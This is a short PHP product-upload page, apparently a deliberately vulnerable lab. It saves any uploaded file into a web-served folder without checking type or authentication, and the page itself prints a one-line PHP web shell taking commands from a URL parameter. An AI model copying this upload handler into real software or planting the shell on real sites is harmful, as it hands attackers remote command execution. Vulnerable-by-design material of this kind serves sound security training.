<?php

require_once 'config.php'; // Include database connection
$uploadDir = "assets/images/"; // Change upload directory

// Ensure the directory exists
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0775, true);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    require_once 'config.php'; // Include database connection

    $fileName = basename($_FILES["file"]["name"]);
    $uploadFile = "assets/images/" . $fileName;
    $productName = $_POST['name'];
    $productPrice = $_POST['price'];
    $productQuantity = $_POST['quantity']; // New quantity input
    $ownerId = 1; // Change based on logged-in user

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $uploadFile)) {
        $stmt = $conn->prepare("INSERT INTO products (name, price, owner_id, image, quantity) VALUES (?, ?, ?, ?, ?)");
        $stmt->bind_param("sdiss", $productName, $productPrice, $ownerId, $uploadFile, $productQuantity);
        $stmt->execute();
        $stmt->close();

        echo "<p style='color:green;'>File uploaded and product added.</p>";
    } else {
        echo "<p style='color:red;'>File upload failed.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload</title>
</head>
<body>
    <h2>Upload a File</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="text" name="name" placeholder="Product Name" required>
        <input type="number" name="price" placeholder="Product Price" required>
        <input type="number" name="quantity" placeholder="Quantity" required> <!-- New field -->
        <input type="file" name="file" required>
        <button type="submit">Upload Product</button>
    </form>

    <h3>Try Uploading a Malicious File:</h3>
    <p>Upload <code>shell.php</code> with content: <br>
    <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
</body>
</html>